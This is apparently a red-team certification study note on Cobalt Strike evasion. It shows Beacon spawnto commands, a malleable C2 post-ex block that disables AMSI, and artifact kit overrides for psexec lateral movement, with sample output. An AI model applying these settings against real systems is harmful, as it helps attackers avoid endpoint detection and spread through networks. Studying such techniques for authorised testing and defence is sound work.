
#### 🖊️ behavioral evasion using Cobalt Strike

1) The process used for post-ex commands and psexec can be changed on the fly in the CS GUI.  To change the post-ex process, use the `spawnto` command.  x86 and x64 must be specified individually and environment variables can also be used.

```
beacon> spawnto x64 %windir%\sysnative\dllhost.exe
beacon> spawnto x86 %windir%\syswow64\dllhost.exe
```
  ⚠ The sysnative and syswow64 paths should be used rather than system32.

2) Tools like [[Powerpick]] and [[Powerview]] should run now without being caught by AMSI
3) You may also set the spawnto inside malleable C2 by including the `spawnto_x64` and `spawnto_x86` directives inside the post-ex block.  Every new Beacon will then use this as their new default.

```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

4) When moving laterally with psexec, Beacon will attempt to use the spawnto setting from your malleable C2 profile.  However, it cannot use environment variables (such as `%windir%`), so will fall back to rundll32 in those cases.  You can override this at runtime with the `ak-settings [name] [full path]` command to specify an absolute path instead.

```
beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe

[*] Updating the spawnto_x64 process to 'C:\Windows\System32\dllhost.exe'
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\rundll32.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'

beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe

[*] Updating the spawnto_x86 process to 'C:\Windows\SysWOW64\dllhost.exe'
[*] artifact kit settings:
[*]    service     = ''
[*]    spawnto_x86 = 'C:\Windows\SysWOW64\dllhost.exe'
[*]    spawnto_x64 = 'C:\Windows\System32\dllhost.exe'
```


#### ⚠ Opsec




### Properties
---
📆 created   {{29-02-2024}} 10:48
🏷️ tags: #redteam #crto 

---

